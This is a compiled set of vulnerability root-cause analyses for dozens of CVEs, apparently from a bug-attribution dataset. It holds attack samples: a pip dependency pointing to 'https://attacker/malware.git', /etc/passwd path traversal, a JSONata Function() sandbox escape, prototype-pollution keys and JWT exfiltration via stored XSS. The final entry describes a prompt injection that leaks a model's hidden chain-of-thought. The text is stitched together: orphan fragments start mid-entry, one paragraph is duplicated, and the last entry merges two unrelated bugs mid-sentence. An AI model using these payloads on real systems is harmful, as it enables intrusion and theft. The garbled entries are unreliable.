causal_chain.bug_semantics: xxl-job ships a sample Bean handler commandJobHandler whose job is to run the executor job parameter as an OS process. Source: authenticated executor POST /run (header XXL-JOB-ACCESS-TOKEN) with executorHandler=commandJobHandler and executorParams set to a command string (issue #3750 uses calc and default_token). Sink: originally Runtime.getRuntime().exec(command); from 78b8eeb4 ProcessBuilder.command(...) then start(); at 3.1.1/HEAD the string is split on spaces into argv. There is no executable allowlist or neutralization. Java ProcessBuilder/Runtime.exec does not invoke a shell, so this is arbitrary command execution of a caller-chosen program rather than classic shell-metacharacter injection, but it is the CWE-78 path NVD/VulDB published. Reachability requires the executor access token; the owner treated that as authorized expected behavior.

causal_chain.bug_semantics: An Owner (database level or above) can DEFINE ACCESS ... TYPE JWT URL / TYPE RECORD ... WITH JWT URL pointing at a JWKS document. Before 3.2.0 the fetcher gated that URL with check_capabilities_url, which parsed the URL and matched only the hostname string (plus optional port) against --allow-net/--deny-net. The subsequent GET used a reqwest client with the default DNS resolver and, until #392, default redirects. An allow-listed hostname that resolved to loopback, link-local, cloud metadata, or RFC1918 therefore caused the server to issue a GET that a literal IP URL would have been denied. The response body is consumed only as JWKS (blind SSRF; liveness/parse timing only). CVE-2026-63736 / GHSA-5x4x-2946-qr67 is that hostname-vs-resolved-IP gap (CWE-918).

causal_chain.bug_semantics: On POST /wan-verify/<state>, webauthn_verify_response accepts a WebAuthn assertion, lets WebAuthnSigninResponseForm.validate() look up the credential globally (find_webauthn(raw_id) then find_user_from_webauthn), and on success writes session['fs_paa']=time.time() without requiring form.user to be the authenticated current_user. The wan_state token from _signin_common carries only challenge/user_verification, so it is not user-bound. An attacker who can drive the victim's already-authenticated but stale session (CSRF/XSS/session-holder) submits their own registered credential's assertion; crypto verifies against the attacker's public key; the victim session's freshness gate is reset while the session identity stays the victim, unlocking @auth_required(within=...) actions.

causal_chain.bug_semantics: Traefik BasicAuth is supposed to run a dummy password-hash comparison when the username is missing so that existing-user bcrypt (~tens of ms) and missing-user paths take similar time. The CVE-2026-32595 mitigation stored a fallback secret by taking a value from the username→hash map and then indexing that map again with the hash as if it were a username. Because hashes are not keys, the fallback is always the empty string. On a missing user, goauth.CheckSecret(password, "") does not match a bcrypt/apr1/SHA prefix and compareMD5HashAndPassword returns immediately, restoring a network-visible timing oracle that enumerates valid usernames. Existing users with a wrong password still pay the real hash cost.

causal_chain.bug_semantics: django.utils.archive.extract() unpacks tar/zip members for startapp --template and startproject --template (TemplateCommand.extract -> archive.extract). After CVE-2021-3281, BaseArchive.target_filename computed filename = abspath(join(target_path, name)) and rejected members only when not filename.startswith(target_path). Because startswith is a string prefix test without a directory-separator boundary, a member whose resolved path is target_path + extra_suffix (for example /tmp/django_proj_template_XXX_extractabc/evil.txt versus target /tmp/django_proj_template_XXX_extract) is treated as in-tree and written outside the intended extraction directory (CWE-23). The 2021 tests covered .., absolute /tmp/evil.py, and Windows d: paths, not this prefix-sharing case. The 2025 fix requires os.path.commonpath([target_path, filename]) == target_path.

causal_chain.bug_semantics: A remote QUIC peer sends STREAM (or CRYPTO) frames with many gaps and omits the in-order prefix. Recv::ingest / crypto_stream.insert call Assembler::insert, which pushes each fragment as a BinaryHeap chunk that retains the originating packet allocation. Ordered RecvStream/AsyncRead cannot advance bytes_read while offset 0 is missing, so chunks stay buffered. Flow control bounds unique bytes, not fragment count; gapped chunks cannot be merged by defragment(), so per-chunk metadata and over-allocation grow without a cap (CWE-770) until process memory is exhausted. The 0.11.15 fix errors after defragment if more than 1024 chunks remain.

causal_chain.bug_semantics: openssl_encrypt derive-key used a non-standard PBKDF2 construction: cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC was invoked with iterations=1 inside an outer Python loop of N rounds (default 100000), with a per-round salt (initially round_salt = previous_output + str(i); later sha256(base_salt+i) or chained password[:16]). Standard PBKDF2 is a single KDF call whose inner iteration count is the work factor (HMAC-SHA256 repeated N times on one salt). A 1-iteration PBKDF2HMAC is one HMAC block; N such calls with rotating salts are not RFC 8018 PBKDF2 and are cheaper to brute-force than PBKDF2-HMAC-SHA256(N) for the same advertised round count. Source is generate_key() when use_pbkdf2 is set (CLI --pbkdf2-iterations / hash_config pbkdf2); sink is PBKDF2HMAC(...).derive(password) in openssl_encrypt/modules/crypt_core.py (vendor-cited ~3852-3860 at the 5cf9dcb tree). A later fallback, used when requested KDFs fail, copied the same 100k x iterations=1 loop. Attack: offline cracking of passwords protecting files encrypted under this KDF. New encryptions were later refused on the explicit PBKDF2 CLI path; 5cf9dcb additionally switched the remaining new-encryption fallback (format_version >= 10) to standard PBKDF2HMAC(iterations=600000). The original loop remains for decrypting the existing PBKDF2 corpus.

causal_chain.bug_semantics: A crafted PSD supplies layer bounding-box integers. Since 10.3.0 those four values are parsed as signed 32-bit (si32be) in PsdImagePlugin._layerinfo and copied into tile extents by _maketile for the C raw/packbits codecs. ImageFile then calls decoder/encoder _setimage with (x0,y0,x1,y1). In C, xoff=x0 and xsize=x1-x0 are 32-bit ints; the safety check was state->xsize + state->xoff > im->xsize (and the y equivalent). If x0 is non-negative but x1 is a large negative (e.g. INT_MIN), x1-x0 wraps to a huge positive xsize, then xsize+xoff wraps again so the comparison against a small image width succeeds. The codec then writes that huge tile into the image buffer (OOB write in src/decode.c / src/encode.c), which can crash or execute code. Pillow 12.1.1 (CVE-2026-25990) added xoff<0/yoff<0 short-circuit checks but left the overflowing sum, so this bypass remained until 12.2.0, which rejects x0<0 or x1<=x0 or x1>im->xsize on the original extents before any addition.

The attacker controls both sides via local PACKET_RX_RING reconfiguration versus poll/recvmsg while PACKET_SOCK_PRESSURE is set.

causal_chain.bug_semantics: LangGraph's default CachePolicy.key_func (default_cache_key) pickles _freeze(args, kwargs) as the task-result cache key. For non-hashable objects exposing .tobytes() (numpy arrays, PIL images), _freeze collapses the value to (type name, raw bytes, optional shape), omitting dtype and PIL mode/size/palette. Two semantically distinct inputs that share a byte layout therefore map to one key. Through the functional API, prepare_push_task_functional invokes key_func(*call.input[0], **call.input[1]); a keyword-argument array/image hits the Mapping recursion then the lossy tobytes branch, so a later request on a shared InMemoryCache/Redis/SQLite cache is served the first request's cached node result without re-execution (cross-request reuse / classification-bypass). Positional args after 331d5b07cebc9e0f271802f9436fcdf0f17c9c84 short-circuit because tuples are Hashable by type and pickle the real object, so they do not collide; that asymmetry is a later change, not the first write of the tobytes triple. VulDB's CWE-327/328 'weak hash' wording is inaccurate: pickle.dumps is a serializer, and the defect is insufficient key uniqueness.

causal_chain.bug_semantics: When the psf/black GitHub Action is invoked with use_pyproject:true, action/main.py reads the checked-out pyproject.toml (typically PR code) and treats a matching project.dependencies / optional-dependencies / dependency-groups entry as the Black requirement. find_black_version_in_array() strips extras and environment markers, then BLACK_VERSION_RE captures everything after the name 'black' once a non-name character appears. That capture is concatenated into req='black[colorama]'+specifier and passed as a single pip install argument. A malicious pull request can set 'black @ https://attacker/malware.git' (or git+https). The capturing regex accepts '@ https://...' so pip installs attacker-controlled code in the action's venv, giving RCE and access to the workflow's secrets/permissions. The version workflow input is not the GHSA path: pull_request workflows use the base workflow file, while pyproject.toml comes from the untrusted checkout. The 26.3.0 fix allowlists only version operators, so direct URL references no longer match.

The advisory is a live published GHSA/CVE (not withdrawn or rejected), so this is a real CWE-20 GitHub Action RCE, not a false positive. The exploitable parser is the permissive BLACK_VERSION_RE that copies a PEP 508 remainder, including '@ https://...', into pip install when use_pyproject reads an untrusted pyproject.toml. Mainline history first shows that regex in squash 3383f531 (#4294). Reconstructing the public PR members shows 278c40d added the pyproject path with a short regex that cannot deliver a URL payload, and c68f988 is the first commit that wrote the capturing regex the security fix later replaced. Parent-tree inspection of be896b1 confirms the short regex only. That makes c68f988 the atomic BIC; the squash is a carrier. The defective regex is present in 24.4.0 through 26.1.0 and absent from 24.3.0; 0a2560b is the direct fix and is contained in 26.3.0, matching the vendor boundary. causal_chain.bug_semantics: Authenticated POST /system/api/saveFile accepts an uploaded .html file (HAXCMSFile.save allowlist includes html) and stores it under the site files/ directory. Visiting that URL is handled by the Express sites middleware: a /files/ match is sendFile'd with Content-Type from mime.getType (.html => text/html) and no Content-Disposition, so the browser executes the stored script in the HAXcms origin. Helmet CSP is off. The script POSTs the open /system/api/refreshAccessToken route; the browser attaches the HttpOnly haxcms_refresh_token cookie, the JSON body returns a fresh admin JWT, and the script exfiltrates it for account takeover. PR:L (upload) and UI:R (admin visits the file) match CVSS 3.1 AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H.

causal_chain.bug_semantics: An unprivileged local process can open a CAN BCM socket (PF_CAN/SOCK_DGRAM/CAN_BCM) and arm TX/RX interval or throttle hrtimers. After ca109491, those hrtimer callbacks run in hardirq and only bounce work to per-op tasklets whose callback argument is the raw bcm_op pointer. Close/teardown (bcm_remove_op) cancels the timers, kills the tasklets, then kfree's the op. The hrtimer can still fire and schedule the tasklet across that window, so the tasklet later dereferences the freed bcm_op (CWE-825). Attacker-controlled slab reuse of that object yields arbitrary kernel code execution and local root. The 2017 cancel/kill loop did not close the race; the 2019 fix runs the handlers in HRTIMER_MODE_SOFT and deletes the tasklets.

causal_chain.bug_semantics: Rancher binds Project Owners to a per-project membership Role/ClusterRole on management.cattle.io/projects with verbs *. That wildcard includes the custom verb updatepsa. rancher-webhook authorizes namespace Pod Security Admission label changes by checking updatepsa on projects. A Cluster Member who owns a project can therefore set pod-security.kubernetes.io/enforce=privileged on a project namespace and run privileged pods that disable container isolation (host access / breakout). Before 2.12, updatepsa was intentionally cluster-role-only (rancher/rancher#48721); 2.12 project-level updatepsa made the long-standing owner * actually reach this sink. The built-in project-owner RoleTemplate itself only has projects/own plus inherited Kubernetes admin, not an explicit updatepsa rule; the membership * is the grant the webhook honors.

Write::delete validates/canonicalizes with getRealPathSafety (does not resolve symlinks), then branches: if isFile then unlink, else recursive directory delete. The APSB25-71 fix canonicalizes with Driver::getRealPath, rejects encoded '..' sequences, confines the resolved path under customer_address, and uses a relative media path for isFile/delete.

causal_chain.bug_semantics: SctpMessageCompletionHandler reassembles incomplete SCTP DATA chunks per streamIdentifier. For every non-complete fragment it stored fragments.put(streamIdentifier, Unpooled.wrappedBuffer(previousAccumulator, newSlice)), creating a new CompositeByteBuf whose first component is the previous composite. After N fragments the readableBytes()/getBytes() path recurses N levels, and each layer retains component arrays. There was no cap on fragment count N, total buffered bytes, or distinct streamIdentifiers (each map entry is an independent nested chain). A remote peer that never sets the complete flag can force unbounded nested composites from 1-byte chunks, exhausting memory/stack (CWE-770 DoS). The 2026 fix stores a flat List<ByteBuf> per stream, enforces maxIncompleteSctpMessages and maxFragments (default 128), and builds one CompositeByteBuf only when the message completes.

causal_chain.bug_semantics: When Parse Server mounts GraphQL with graphQLPublicIntrospection=false (default since GHSA-48q3-prgv-gm4w), IntrospectionControlPlugin only blocks __schema at didResolveOperation. graphql-js still embeds schema-derived 'Did you mean ...?' suffixes in errors from a later phase: variable coercion of unknown enum values and unknown input-object fields (coerceInputValue). An unauthenticated caller who knows only the public application id submits queries/mutations with near-miss variables (e.g. CallCloudCodeInput.functionName='secretAdminTas', UserWhereInput.usernme) and reads the suggestion to recover hidden identifiers (registered Cloud Code function names, Parse class and field names), including copies graphql-js duplicates into extensions.stacktrace in non-production. GHSA-8cph-rgr4-g5vj's SchemaSuggestionsControlPlugin stripped the suffix only inside validationDidStart, so coercion errors produced during execution were returned intact. The complete fix strips the suffix from every error in willSendResponse for non-master/non-maintenance callers.

causal_chain.flaw_origin: The leak is graphql-js default suggestion text forwarded by Parse GraphQL, not a parse-server string that itself contains 'Did you mean'. graphqlExpress first appeared in PR #5674 member 99881ed1ee820e882c0edd4d5d8c9256e491d093, but that schema could not yet coerce Parse field names. The smallest first-write of the advisory's input-object coercion path is member dac2af99fd8f7d3146dcfa33e1e03daf265b0c68, which first wrapped Parse class fields in GraphQLInputObjectType and passed that type to create/update mutations. Those members were squashed onto master as fe2e95622f69ca8bd5c41ac0ea550f98ebcd4a91 (GraphQL Support #5674, released in 3.5.0). Schema-hiding later made the pre-existing suggestions a bypass: c58b2eb6eb48af9d3c2e69b4829810a021347b40 (IntrospectionControlPlugin) then 155123ade9bc88cdf4807cf267ea1196f9274773 (validation-only SchemaSuggestionsControlPlugin). 155123ad is attempted remediation, not the BIC: its parent still returns unstripped coercion suggestions.
causal_chain.flip_condition: an AI marker (trailer, co-author or bot author) on dac2af99fd8f, or a first-party disclosure bound to that change.

CVE.org CVE-2026-64627 state=PUBLISHED (not rejected/withdrawn); CNA VulnCheck; CWE-209; patched 9.10.0-alpha.4 and 8.6.85.

Vendor advisory GHSA-9g8f-h8f3-hjcm (2026-07-08): with graphQLPublicIntrospection=false (default), graphql-js 'Did you mean ...?' hints in variable-coercion errors were still returned; IntrospectionControlPlugin / SchemaSuggestionsControlPlugin only covered validationDidStart. Unauthenticated caller with only the public app id iterates near-miss enum values or input-object field names to recover Cloud Code function names and Parse class/field names. Follow-up bypass of GHSA-8cph-rgr4-g5vj.

Attack confirmed by tests added in 2625489a27c07aed1283c5dc9c5e8f8f53a9e44c spec/ParseGraphQLServer.spec.js: CallCloudCodeInput.functionName='secretAdminTas' must not return 'Did you mean'/'secretAdminTask'; UserWhereInput.usernme must not return 'username'; master-key and graphQLPublicIntrospection=true retain suggestions.
Direct fix in src/GraphQL/ParseGraphQLServer.js moves SchemaSuggestionsControlPlugin from validationDidStart to willSendResponse and strips the suffix from response errors and extensions.stacktrace.

causal_chain.reasoning: CVE-2026-64627 / GHSA-rjjh-vx7v-m7mf is a real CWE-209 follow-up bypass, confirmed by the vendor GHSA-9g8f-h8f3-hjcm, the published CVE record, and the #10563 regression tests. graphql-js suggestion text in variable-coercion errors is returned to unauthenticated GraphQL callers while public introspection is disabled, recovering Cloud Code function names and Parse field names. The 2026 incomplete plugin that only sanitized validationDidStart (155123ad / GHSA-8cph-rgr4-g5vj) is not the introducer: its parent already leaked coercion suggestions. The original defective combination is Parse Server forwarding unsanitized graphql-js errors once Parse class fields existed as GraphQL input objects. That first-write is PR #5674 member dac2af99fd8f7d3146dcfa33e1e03daf265b0c68 (parent e1c8ad0e lacks GraphQLInputObjectType); the graphqlExpress channel is earlier member 99881ed1; both landed on master via squash fe2e95622 and shipped in 3.5.0, which precedes the affected 8.x/<8.6.85 and 9.x/>=9.0.0 ranges. Direct closure is 2625489a (#10563) in 9.10.0-alpha.4, with 8.x backport 2728fcba (#10564) in 8.6.85. AI attribution is taken only from the BIC commit object: 2019 human davimacedo, no AI trailers. Therefore the closed verdict is NOT_AI.

causal_chain.bug_semantics: With open email/password registration, an attacker signs up at the victim's address with an attacker-chosen password. The row stays emailVerified=false, so password sign-in is blocked when requireEmailVerification is on. When the victim later proves mailbox control, magic-link GET /magic-link/verify and email-OTP POST sign-in both resolve that existing user, set emailVerified=true, and mint a session without deleting the credential account or revoking sessions. The planted password then authenticates as the now-verified owner. New-user auto-signup in the same handlers (createUser with emailVerified:true) is not the hijack; the defect is adopting an unproven pre-existing credential row as verified. The fix treats current mailbox proof as authoritative: revokeUnprovenAccountAccess strips credential accounts and sessions before the verify flip.

causal_chain.bug_semantics: An attacker uploads a file whose filename extension passes fileUpload.fileExtensions (default excludes HTML; e.g. evil.txt) while sending Content-Type text/html (REST header or JSON _ContentType). FilesRouter validates the extension independently of MIME and forwards the user Content-Type into FilesController.createFile. Before the fix, createFile only derived MIME from the filename when contentType was missing; if both extension and Content-Type were present, the user MIME was stored. Adapters that persist and serve that header (S3, GCS) then deliver the body as text/html, enabling stored XSS / content-type confusion (CWE-436). Parse Server's own GET path and GridFS derive Content-Type from the filename at serve time, so the default adapter is not a sink.

causal_chain.bug_semantics: expandapk.Split parses an APK as concatenated gzip members. After gzip.NewReader + Multistream(false) and reading the first tar header, it drains the rest of that gzip member with io.Copy(io.Discard, gzi) for the optional .SIGN. stream and again for the control stream, with no uncompressed-size or inflate-ratio limit. An attacker-controlled APK therefore forces the process to fully inflate those gzip members, causing unbounded CPU/time (CWE-400/770 availability). The leftover data section is then returned as the raw remainder of the input. The v1.1.0 fix wraps those gzip drains (and the data remainder) in limitio limited readers.

causal_chain.bug_semantics: NLTK 3.9.4 introduced nltk.pathsec as a centralized I/O sentinel. pathsec.open() calls validate_path() and, when ENFORCE is True, raises PermissionError for paths outside allowed NLTK data roots before delegating to builtins.open(). StreamBackedCorpusView in nltk/corpus/reader/util.py accepts a raw string fileid and, in _open(), still calls builtins.open(self._fileid, "rb") (and SeekableUnicodeStreamReader on that handle). That path never hits validate_path, so an attacker who can supply fileid (web/API/multi-tenant NLP pipeline) can read arbitrary local files such as /etc/passwd even with ENFORCE=True. XMLCorpusView subclasses StreamBackedCorpusView, so the same _open sink applies. The content-read is the open() branch; os.stat on the string fileid leaks size/existence only.

causal_chain.bug_semantics: Apache ActiveMQ Classic authorization is supposed to require the destination admin ACL to create or delete queues/topics. A client destroyDestination() sends OpenWire DestinationInfo REMOVE, which the broker dispatches to AuthorizationBroker.removeDestinationInfo (and removeDestination). After AMQ-3851 those methods shared checkDestinationAdmin, which returned true whenever the destination already existed and therefore never consulted admin ACLs on the only case that matters for deletion. Any authenticated connection could delete existing destinations it was not permitted to administer (DoS/availability). The 2026 fix keeps the add short-circuit (skip admin if dest exists) and inverts it for remove (skip admin only if dest does not exist; require admin if it does).

causal_chain.bug_semantics: Portainer's shared JWT authentication path accepted a bearer token from the URL query parameter token in addition to the Authorization header. Because that lookup ran inside AuthenticatedAccess (later JWTAuthLookup -> extractBearerToken in api/http/security/bouncer.go), any authenticated HTTP API could be authorized with ?token=<JWT>, not only WebSocket exec/attach/pod shell. Browsers and the UI put the session JWT into those WebSocket URLs; reverse proxies, access logs, browser history, and Referer headers then recorded the full JWT. Anyone who obtained the leaked token inherited the victim's Portainer privileges until expiry (default 8 hours). The 2023 cookie-auth rewrite still accepted and then deleted the query parameter from r.URL.RawQuery, which does not stop upstream log/referer leakage. The 2026 fix removes query-token acceptance entirely and relies on the Authorization header and the HttpOnly portainer_api_key cookie (sent automatically on same-origin WebSocket upgrades).

causal_chain.bug_semantics: In the rtl2832_sdr V4L2 SDR driver, vb2 delivers capture buffers to rtl2832_sdr_buf_queue() (list_add_tail onto dev->queued_bufs) before it calls rtl2832_sdr_start_streaming(). That start callback can fail on missing USB device (-ENODEV), interrupted v4l2_lock (-ERESTARTSYS), or any of six setup steps (subdev s_power/tuner, tuner frequency, ADC, stream-buffer alloc, URB alloc, URB submit). Those paths returned the error without vb2_buffer_done() on the already-owned queued buffers, so vb2_start_streaming() hits WARN_ON(owned_by_drv_count), the buffers leak, and later URB completion or buf_queue list_add_tail can operate on freed vb2 objects (local ioctl UAF). The original function also fell through a shared err label on success, so cleanup could not be added there without an explicit success return.

causal_chain.bug_semantics: JSONata evaluates user expressions against nested environments created by createFrame. Each frame stored variables in `var bindings = {}` and resolved names with ordinary property access (originally `bindings[name]`; later a bypassable `bindings.hasOwnProperty(name)`). Because bindings inherited Object.prototype, `$constructor` and `$__proto__` could be read off the prototype. `bind` did `bindings[name] = value`, so `$__proto__ := $constructor` retargeted [[Prototype]] onto the Object constructor, after which `$constructor` was Function. The GHSA PoC first overwrites `$hasOwnProperty` (so the later instance-method check no longer gates own-property lookup), then uses that chain to invoke `Function('return process.getBuiltinModule(...)')()` and run host code. The 2.2.1/1.8.8 fix uses Object.create(null) plus Object.prototype.hasOwnProperty.call, which blocks both inherited lookups and method replacement.

causal_chain.bug_semantics: Applications that deserialize untrusted MessagePack maps into System.Dynamic.ExpandoObject via ExpandoObjectFormatter.Deserialize or ExpandoObjectResolver (including nested maps from PrimitiveObjectWithExpandoMaps.DeserializeMap / the original PrimitiveObjectFormatter.InstanceWithExpandoObject path) allocate an ExpandoObject and call IDictionary<string, object>.Add once per map key. ExpandoObject stores member names in array-like structures, so each insert can scan and copy existing members. An attacker-controlled map with many distinct keys therefore costs quadratic CPU and allocations relative to encoded size. MessagePackSecurity.UntrustedData only swaps dictionary comparers and does not bound or hash ExpandoObject insertion, so the UntrustedData preset advertised on ExpandoObjectResolver.Options does not stop the super-linear work. The 2026 fix rejects maps larger than 1024 entries when options.Security.HashCollisionResistant is set.

The JSON org-create API instead bound go-gogs-client CreateOrgOption.UserName with only Required. CreateOrganization's isUsernameAllowed/IsUsableName check is a reserved-name list, not a character class, so a name such as ../../../../data/gogs/data/tmp/local-r/{id}/nested is stored and materialized on disk. Creating a repository under that org writes a nested .git (including hooks/) into another repository's local worktree; the attacker then commits a malicious hooks/update through the outer repo and triggers it, getting RCE as the git user. Default self-registration plus POST /api/v1/user/orgs makes this unauthenticated-to-RCE after account creation.

causal_chain.bug_semantics: Qwik City request handling parses application/x-www-form-urlencoded and multipart/form-data through formToObj. Starting with the complex-form rewrite, a dotted name such as items.0 made formToObj allocate items as a JavaScript Array because Number.isNaN(+nextKey) was false for numeric segments. A later field on the same path (items.toString, items.push, items.valueOf, items.length) then assigned onto that Array, overwriting methods or inflating length. Application code that treated parsed form data as a well-formed array could throw, confuse types, or do extra work. The 1.19.2 fix precomputes array paths and only creates an array when every key at that path is a canonical non-negative integer, dropping non-index keys instead of polluting the array.

Sink: formToObj inferred nested arrays whenever the next dotted key was numeric via Number.isNaN(+nextKey) ? {} : [], then wrote later attacker keys (items.toString, items.push, items.valueOf, items.length) onto that Array, causing type confusion and possible length inflation/DoS.

Tag checks place the landing in v1.2.8 through 1.19.1 and the fix in 1.19.2, matching CVE/GHSA. A subject with packages.fission.io/create in ns-attacker can point spec.environment.namespace at ns-victim, run code (for example an npm preinstall hook) inside the victim builder, and exfiltrate that namespace's fission-builder bearer token, which can read Secrets and ConfigMaps in the victim namespace. Empty env namespace remains accepted and defaults to the package's own namespace.

causal_chain.bug_semantics: MessagePack typeless deserialization (ext type 100) lets the payload name a .NET type. TypelessFormatter resolves that name and, starting in 2019, calls MessagePackSerializerOptions.ThrowIfDeserializingTypeIsDisallowed before constructing a formatter. The default implementation compared only the outer type.FullName to a small DisallowedTypes set (and any user override of the virtual method likewise saw only the wrapper). An attacker who can submit typeless data can therefore send a blocked gadget as T[] or List<T> (or another constructed generic): the wrapper name is not on the list, the check returns, and the formatter pipeline still instantiates formatters for the inner blocked type. That is CWE-470/CWE-502 weakening of the advertised type-restriction hook, not a new gadget by itself. The 2026 fix keeps the leaf check in ThrowIfDeserializingTypeIsDisallowedCore and recursively walks array/pointer/byref element types and constructed generic arguments before formatter resolution.

causal_chain.bug_semantics: psd-tools decompress() is reached when parsing untrusted PSD/PSB channel payloads. For Compression.ZIP and ZIP_WITH_PREDICTION it called zlib.decompress(data) with no max_length, so a small compressed blob can expand to gigabytes and OOM the process before any expected-size check. Independently, width/height/depth were multiplied into allocation sizes (length = width * height * max(1, depth // 8) and RLE row_size) with no Adobe-spec upper bound, so a malformed header can request a huge buffer. The only post-decompress size integrity check was assert len(result) == length, which python -O removes. A separate Low Cython issue used 32-bit cdef int indices against Py_ssize_t row size, theoretically wrapping above INT_MAX. Attack path: feed a crafted PSD with ZIP-compressed channels (and/or huge declared dimensions) to PSDImage.open / composite / export.

Mercurius itself only extra-parses application/graphql. The vendor fix is Apollo-style CSRF prevention: require a non-simple Content-Type or a custom header so the browser must preflight. POST application/json already preflights; GET was the Mercurius-owned simple-request sink in the affected v16 range.

causal_chain.bug_semantics: CWE-22 path traversal in CowAgent memory content reads. User-controlled filename from GET /api/memory/content (MemoryContentHandler in channel/web/web_channel.py) or from MemoryService.dispatch(action='content', payload.filename) is passed to get_content, which calls _resolve_path. For any name other than the literal 'MEMORY.md', _resolve_path returns os.path.join(self.memory_dir, filename) without rejecting '..', normalizing, or confining to memory_dir. get_content then open()s that path, so sequences such as ../../../../../../../etc/passwd or a relative path to config.json read arbitrary files the process can open. The same resolver is also reached via CloudClient.on_memory. The 2.0.5 fix canonicalizes with os.path.realpath and raises ValueError when the result escapes the allowed directory.

causal_chain.bug_semantics: JSONTaggedDecoder.decode_obj() in nltk/jsontags.py walks every nested dict and list by calling itself with no depth bound. An attacker who can supply JSON to JSONTaggedDecoder (json.loads(..., cls=JSONTaggedDecoder) or equivalent) can send a payload nested deeper than sys.getrecursionlimit() (default 1000). Python then raises an unhandled RecursionError in decode_obj (or in the C json parser before decode_obj runs), crashing the process (CWE-674 DoS). The original 2013 decoder only unwrapped a single !tagged object and did not recurse; the unbounded walk was added so nested tagged objects would decode. The 3.9.4 fix bounds decode_obj with MAX_DECODE_DEPTH=200 and converts RecursionError in decode() into ValueError.

An attacker who can supply JSON to JSONTaggedDecoder (json.loads(..., cls=JSONTaggedDecoder) or equivalent) can send a payload nested deeper than sys.getrecursionlimit() (default 1000). Python then raises an unhandled RecursionError in decode_obj (or in the C json parser before decode_obj runs), crashing the process (CWE-674 DoS). The original 2013 decoder only unwrapped a single !tagged object and did not recurse; the unbounded walk was added so nested tagged objects would decode. The 3.9.4 fix bounds decode_obj with MAX_DECODE_DEPTH=200 and converts RecursionError in decode() into ValueError.",

causal_chain.bug_semantics: When basic-auth is enabled, CreateModelVersion is authorized only on UPDATE of the caller’s registered model. Core _validate_source_run/_validate_source_model in mlflow/server/handlers.py only prove that a local source path sits inside the artifact directory of the supplied run_id or model_id (store.get_run/get_logged_model with no permission check). After the version is stored, GET /model-versions/get-artifact is gated on registered-model READ (validate_can_read_model_version_artifact), whereas GET /get-artifact requires experiment/run READ (validate_can_read_run_artifact). An authenticated user who can create or update a registered model can therefore pass another user’s run_id (or model_id) and that run’s artifact URI as source, then download the victim’s files through their own model version, bypassing the experiment-level READ gate. The first-party fix closes the gap at create time by requiring READ on any supplied run_id/model_id.

causal_chain.bug_semantics: On Windows, claude-hud's Claude Code version probe in src/version.ts wraps .cmd/.bat binaries by spawning execFile(file, ['/d','/s','/c', quotedCommand]). file is taken from process.env.COMSPEC (or unqualified 'cmd.exe' if unset) with no check that it is System32\cmd.exe. A local attacker who can set COMSPEC before the HUD runs (prior process, installer, npm lifecycle) causes execFile() to execute the attacker-supplied path with cmd.exe argument structure, yielding arbitrary code execution as the HUD user. Source is comspecImpl/_getClaudeVersionInvocation; sink is getClaudeCodeVersion()'s execFileImpl(invocation.file, invocation.args).

causal_chain.bug_semantics: devalue.parse JSON.parses a payload into a values array, then unflatten/hydrate walks it. Plain-object records are rebuilt with `for (const key in value) { object[key] = hydrate(value[key]); }` on a normal `{}`. A crafted key `__proto__` therefore hits Object.prototype.__proto__ and installs a new prototype, so later own properties (including getters such as magnitude in the GHSA Vector PoC) can be overwritten. Property values that are strings rather than numeric indices are passed to hydrate; because hydrate used `index in hydrated` / `values[index]` on an Array without requiring typeof index === 'number', strings such as `push` or `toString` resolve to Array.prototype methods and get assigned onto the revived object (GHSA PoC `[{ "toString":"push" }]`). Attacker-controlled serialized input is the source; polluted prototypes and hijacked methods on the parsed object are the sink (CWE-1321).

Pre-fix ResponseParser.validate (6405491559411a702ae4fe0f551a6341cc9dbd1d apps/meteor/app/meteor-accounts-saml/server/lib/parsers/Response.ts) selects the first samlp:Response via getElementsByTagNameNS without requiring it to be documentElement, then verifySignatures -> validateSignatureChildren (direct Signature child of Response/Assertion) -> validateSignature which only calls xml-crypto SignedXml.checkSignature(xml).

Identity is then taken from that Response's Assertion (NameID/AttributeStatement). Because checkSignature is not bound to the processed element's ID, a wrapped document can carry a trusted IdP signature covering some other node while the parser logs in using unsigned/forged attributes.

causal_chain.bug_semantics: datamodel-code-generator honors JSON Schema vendor extension x-python-type. From 0.51.0, JsonSchemaParser._get_python_type_override copies that string into DataType.type whenever it is judged incompatible with the schema type. DataType.type_hint then emits the string unescaped into generated field annotations. With default from __future__ import annotations, a value such as `X[1]; <python-stmt>` is a valid class-body line: the X[1] annotation is postponed, and the statement after the semicolon executes when the generated module is imported. No extra CLI flags are required. The only pre-fix transform (dotted prefix before the first '[') does not fire for this payload. The 0.60.2 fix rejects non-annotation ASTs via is_python_type_annotation before any DataType is built.

causal_chain.bug_semantics: GitPython's documented defense Git.check_unsafe_options is supposed to reject command-executing git options (--upload-pack/-u, --receive-pack, --exec, --config/-c) unless allow_unsafe_options=True. Clone, fetch, pull, and push pass caller kwargs keys and multi_options into that guard, then emit dashified long options to git. Git uniquely expands unambiguous long-option prefixes, so upload_p / --upload-p is executed as --upload-pack=<helper>. From 3.1.30 the guard compared startswith(full-unsafe-name) or exact bare name, which blocks --upload-pack=value but not --upload-p. The 3.1.47 GHSA-rpm5 rewrite dashifies underscores and does exact dict lookup, blocking upload_pack but still missing upload_p. The helper runs in the caller process (RCE) when a host application forwards attacker-controlled kwarg names.

causal_chain.bug_semantics: bb.generate(config) deep-merges attacker-controlled chart options through mergeObj into a plain object {}. mergeObj walks Object.keys(source) and recursively writes every key, including the own-property name '__proto__' produced by JSON.parse or a computed key. Because the merge target is {}, target['__proto__'] is Object.prototype; the recursive assignment therefore installs arbitrary properties on Object.prototype (CWE-1321). That polluted prototype then affects all subsequent objects in the page (DoS or further gadget-dependent RCE as described by NAVER/NVD). Nested payloads under data.__proto__ follow the same recursive path. causal_chain.bug_semantics: A reachable SpdyFrameCodec zlib SPDY HEADERS decoder fully inflates a compressed header block even after SpdyHeaderBlockRawDecoder has marked the frame truncated for exceeding maxHeaderSize. GatewayStreamConsumer._filter_and_accumulate (copied into the gateway from the CLI _stream_delta state machine) detected tags with case-sensitive str.find() against a hardcoded tuple that listed only some casings (<think>, <thinking>, <THINKING>, <thought>, <reasoning>, <REASONING_SCRATCHPAD>). Prompt injection that tells the model to wrap reasoning in those variants is the disclosed remote trigger. The final post-process path using re.IGNORECASE still removed the tags from the kept message, so the leak is mid-stream information disclosure of hidden chain-of-thought.

